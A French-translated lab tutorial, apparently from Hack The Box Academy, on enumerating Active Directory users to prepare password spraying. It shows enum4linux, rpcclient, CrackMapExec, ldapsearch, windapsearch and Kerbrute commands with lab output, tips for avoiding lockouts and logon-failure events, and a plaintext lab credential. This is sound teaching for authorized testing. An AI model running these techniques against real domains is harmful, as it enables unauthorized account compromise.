Pulvérisation de mot de passe - Créer une liste d'utilisateurs cibles
=====================================================================

* * * * *

Énumération détaillée des utilisateurs
--------------------------------------

Pour monter une attaque par pulvérisation de mot de passe réussie, nous avons d'abord besoin d'une liste d'utilisateurs de domaine valides avec lesquels tenter de s'authentifier. Il existe plusieurs façons de rassembler une liste cible d'utilisateurs valides :

-   En tirant parti d'une session SMB NULL pour récupérer une liste complète des utilisateurs du domaine à partir du contrôleur de domaine
-   Utilisation d'une liaison LDAP anonyme pour interroger LDAP de manière anonyme et dérouler la liste des utilisateurs du domaine
-   Utiliser un outil tel que `Kerbrute`pour valider les utilisateurs en utilisant une liste de mots à partir d'une source telle que le référentiel GitHub [des noms d'utilisateur statistiquement probables](https://github.com/insidetrust/statistically-likely-usernames) , ou rassemblés à l'aide d'un outil tel que [linkedin2username](https://github.com/initstring/linkedin2username) pour créer une liste d'utilisateurs potentiellement valides
-   Utilisation d'un ensemble d'informations d'identification d'un système d'attaque Linux ou Windows fourni par notre client ou obtenu par un autre moyen tel que l'empoisonnement de la réponse LLMNR/NBT-NS à l'aide `Responder`ou même une pulvérisation de mot de passe réussie à l'aide d'une liste de mots plus petite

Quelle que soit la méthode que nous choisissons, il est également essentiel pour nous de tenir compte de la politique de mot de passe du domaine. Si nous avons une session SMB NULL, une liaison anonyme LDAP ou un ensemble d'informations d'identification valides, nous pouvons énumérer la stratégie de mot de passe. Avoir cette politique en main est très utile car la longueur minimale du mot de passe et l'activation ou non de la complexité du mot de passe peuvent nous aider à formuler la liste des mots de passe que nous essaierons lors de nos tentatives de pulvérisation. Connaître le seuil de verrouillage de compte et la minuterie de mauvais mot de passe nous dira combien de tentatives de pulvérisation nous pouvons faire à la fois sans verrouiller aucun compte et combien de minutes nous devons attendre entre les tentatives de pulvérisation.

Encore une fois, si nous ne connaissons pas la politique de mot de passe, nous pouvons toujours demander à notre client, et, s'il ne la fournit pas, nous pouvons soit essayer une tentative de pulvérisation de mot de passe très ciblée comme un "hail mary" si toutes les autres options pour un pied ont été épuisés. Nous pourrions également essayer une pulvérisation toutes les quelques heures pour tenter de ne verrouiller aucun compte. Quelle que soit la méthode que nous choisissons, et que nous ayons la politique de mot de passe ou non, nous devons toujours conserver un journal de nos activités, y compris, mais sans s'y limiter :

-   Les comptes ciblés
-   Contrôleur de domaine utilisé dans l'attaque
-   Heure de la pulvérisation
-   Date de la pulvérisation
-   Mot de passe(s) tenté(s)

Cela nous aidera à nous assurer que nous ne dupliquons pas nos efforts. Si un verrouillage de compte se produit ou si notre client remarque des tentatives de connexion suspectes, nous pouvons lui fournir nos notes pour vérifier par recoupement avec ses systèmes de journalisation et nous assurer que rien de malfaisant ne se passe sur le réseau.

* * * * *

Session SMB NULL pour extraire la liste des utilisateurs
--------------------------------------------------------

Si vous êtes sur une machine interne mais que vous ne disposez pas d'informations d'identification de domaine valides, vous pouvez rechercher des sessions SMB NULL ou des liaisons anonymes LDAP sur les contrôleurs de domaine. L'un ou l'autre vous permettra d'obtenir une liste précise de tous les utilisateurs d'Active Directory et de la politique de mot de passe. Si vous disposez déjà d'informations d'identification pour un utilisateur de domaine ou `SYSTEM`d'un accès sur un hôte Windows, vous pouvez facilement interroger Active Directory pour obtenir ces informations.

Il est possible de le faire en utilisant le compte SYSTEM car il peut `impersonate`l'ordinateur. Un objet ordinateur est traité comme un compte d'utilisateur de domaine (avec quelques différences, telles que l'authentification entre les approbations de forêt). Si vous ne disposez pas d'un compte de domaine valide et que les sessions SMB NULL et les liaisons anonymes LDAP ne sont pas possibles, vous pouvez créer une liste d'utilisateurs à l'aide de ressources externes telles que la collecte d'e-mails et LinkedIn. Cette liste d'utilisateurs ne sera pas aussi complète, mais elle peut suffire à vous donner accès à Active Directory.

Certains outils pouvant tirer parti des sessions SMB NULL et des liaisons anonymes LDAP incluent [enum4linux](https://github.com/portcullislabs/enum4linux) , [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) et [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) , entre autres. Quel que soit l'outil, nous devrons filtrer un peu pour nettoyer la sortie et obtenir une liste de noms d'utilisateur uniquement, un sur chaque ligne. Nous pouvons le faire avec `enum4linux`le `-U`drapeau.

#### Utiliser enum4linux

  Utiliser enum4linux

```
dsgsec@htb[/htb]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

administrator
guest
krbtgt
lab_adm
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch
ccruz
njohnson
mholliday

<SNIP>

```

Nous pouvons utiliser la `enumdomusers`commande après nous être connectés de manière anonyme en utilisant `rpcclient`.

#### Utilisation de rpcclient

  Utilisation de rpcclient

```
dsgsec@htb[/htb]$ rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]

<SNIP>

```

Enfin, nous pouvons utiliser `CrackMapExec`avec le `--users`drapeau. Il s'agit d'un outil utile qui affichera également les `badpwdcount`(tentatives de connexion non valides), afin que nous puissions supprimer tous les comptes de notre liste qui sont proches du seuil de verrouillage. Il affiche également le `baddpwdtime`, qui est la date et l'heure de la dernière tentative de mot de passe incorrect, afin que nous puissions voir à quel point un compte est proche d'avoir sa `badpwdcount`réinitialisation. Dans un environnement avec plusieurs contrôleurs de domaine, cette valeur est conservée séparément sur chacun d'eux. Pour obtenir un total précis des tentatives de mot de passe incorrect du compte, nous devrions soit interroger chaque contrôleur de domaine et utiliser la somme des valeurs, soit interroger le contrôleur de domaine avec le rôle FSMO de l'émulateur PDC.

#### Utilisation de l'indicateur CrackMapExec --users

  Utilisation de l'indicateur CrackMapExec --users

```
dsgsec@htb[/htb]$ crackmapexec smb 172.16.5.5 --users

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 0 baddpwdtime: 2022-02-17 22:59:22.684613

<SNIP>

```

* * * * *

Collecter des utilisateurs avec LDAP anonyme
--------------------------------------------

Nous pouvons utiliser divers outils pour rassembler les utilisateurs lorsque nous trouvons une liaison LDAP anonyme. Quelques exemples incluent [windapsearch](https://github.com/ropnop/windapsearch) et [ldapsearch](https://linux.die.net/man/1/ldapsearch) . Si nous choisissons d'utiliser, `ldapsearch`nous devrons spécifier un filtre de recherche LDAP valide. Nous pouvons en savoir plus sur ces filtres de recherche dans le module [Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap) .

#### Utilisation de ldapsearch

  Utilisation de ldapsearch

```
dsgsec@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

guest
ACADEMY-EA-DC01$
ACADEMY-EA-MS01$
ACADEMY-EA-WEB01$
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch

<SNIP>

```

Des outils tels que `windapsearch`facilitent cela (bien que nous devions toujours comprendre comment créer nos propres filtres de recherche LDAP). Ici, nous pouvons spécifier un accès anonyme en fournissant un nom d'utilisateur vide avec le `-u`drapeau et le `-U`drapeau pour indiquer à l'outil de récupérer uniquement les utilisateurs.

#### Utilisation de windapsearch

  Utilisation de windapsearch

```
dsgsec@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as:
[+]	 None

[+] Enumerating all AD users
[+]	Found 2906 users:

cn: Guest

cn: Htb Student
userPrincipalName: htb-student@inlanefreight.local

cn: Annie Vazquez
userPrincipalName: avazquez@inlanefreight.local

cn: Paul Falcon
userPrincipalName: pfalcon@inlanefreight.local

cn: Fae Anthony
userPrincipalName: fanthony@inlanefreight.local

cn: Walter Dillard
userPrincipalName: wdillard@inlanefreight.local

<SNIP>

```

* * * * *

Énumération des utilisateurs avec Kerbrute
------------------------------------------

Comme mentionné dans la `Initial Enumeration of The Domain`section, si nous n'avons aucun accès depuis notre position dans le réseau interne, nous pouvons utiliser `Kerbrute`pour énumérer les comptes AD valides et pour la pulvérisation de mot de passe.

Cet outil utilise [la pré-authentification Kerberos](https://ldapwiki.com/wiki/Kerberos%20Pre-Authentication) , qui est un moyen beaucoup plus rapide et potentiellement plus furtif d'effectuer la pulvérisation de mot de passe. Cette méthode ne génère pas l'ID d'événement Windows [4625 : Un compte n'a pas pu se connecter](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) ou un échec de connexion qui est souvent surveillé. L'outil envoie des demandes TGT au contrôleur de domaine sans pré-authentification Kerberos pour effectuer l'énumération des noms d'utilisateur. Si le KDC répond avec l'erreur`PRINCIPAL UNKNOWN`, le nom d'utilisateur est invalide. Chaque fois que le KDC demande la pré-authentification Kerberos, cela signale que le nom d'utilisateur existe et l'outil le marquera comme valide. Cette méthode d'énumération des noms d'utilisateur ne provoque pas d'échecs de connexion et ne verrouille pas les comptes. Cependant, une fois que nous avons une liste d'utilisateurs valides et que nous changeons de vitesse pour utiliser cet outil pour la pulvérisation de mot de passe, les tentatives de pré-authentification Kerberos échouées seront comptabilisées dans les comptes de connexion échoués d'un compte et peuvent entraîner le verrouillage du compte, nous devons donc toujours être prudents. la méthode choisie.

Essayons cette méthode en utilisant la liste de mots [jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt) de 48 705 noms d'utilisateur courants possibles au format `flast`. Le référentiel GitHub [de noms d'utilisateur statistiquement probables](https://github.com/insidetrust/statistically-likely-usernames) est une excellente ressource pour ce type d'attaque et contient une variété de listes de noms d'utilisateur différentes que nous pouvons utiliser pour énumérer les noms d'utilisateur valides à l'aide de `Kerbrute`.

#### Énumération des utilisateurs Kerbrute

  Énumération des utilisateurs Kerbrute

```
dsgsec@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _\
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:16:11 >  Using KDC(s):
2022/02/17 22:16:11 >  	172.16.5.5:88

2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local

<SNIP>

```

Nous avons vérifié plus de 48 000 noms d'utilisateur en un peu plus de 12 secondes et découvert plus de 50 noms valides. L'utilisation de Kerbrute pour l'énumération des noms d'utilisateur générera l'ID d'événement [4768 : un ticket d'authentification Kerberos (TGT) a été demandé](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768) . Cela ne sera déclenché que si [la journalisation des événements Kerberos](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging) est activée via la stratégie de groupe. Les défenseurs peuvent ajuster leurs outils SIEM pour rechercher un afflux de cet ID d'événement, ce qui peut indiquer une attaque. Si nous réussissons avec cette méthode lors d'un test d'intrusion, cela peut être une excellente recommandation à ajouter à notre rapport.

Si nous ne sommes pas en mesure de créer une liste de noms d'utilisateur valides à l'aide de l'une des méthodes décrites ci-dessus, nous pouvons revenir à la collecte d'informations externes et rechercher des adresses e-mail d'entreprise ou utiliser un outil tel que linkedin2username pour mélanger les noms d'utilisateur possibles à partir de la page LinkedIn d'une [entreprise](https://github.com/initstring/linkedin2username) .

* * * * *

Énumération accréditée pour construire notre liste d'utilisateurs
-----------------------------------------------------------------

Avec des informations d'identification valides, nous pouvons utiliser l'un des outils indiqués précédemment pour créer une liste d'utilisateurs. Un moyen simple et rapide consiste à utiliser CrackMapExec.

#### Utilisation de CrackMapExec avec des informations d'identification valides

  Utilisation de CrackMapExec avec des informations d'identification valides

```
dsgsec@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

[sudo] password for htb-student:
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\htb-student:Academy_student_AD!
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 1 baddpwdtime: 2022-02-23 21:43:35.059620
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 20 baddpwdtime: 2022-02-17 22:59:22.684613
SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\pfalcon                        badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58

<SNIP>

```

* * * * *

Maintenant pour le plaisir
--------------------------

Maintenant que nous avons couvert la création d'une liste d'utilisateurs cibles pour la pulvérisation et discuté des politiques de mot de passe, mettons les mains dans le cambouis en effectuant des attaques par pulvérisation de mot de passe de plusieurs manières depuis un hôte d'attaque Linux, puis depuis un hôte Windows.
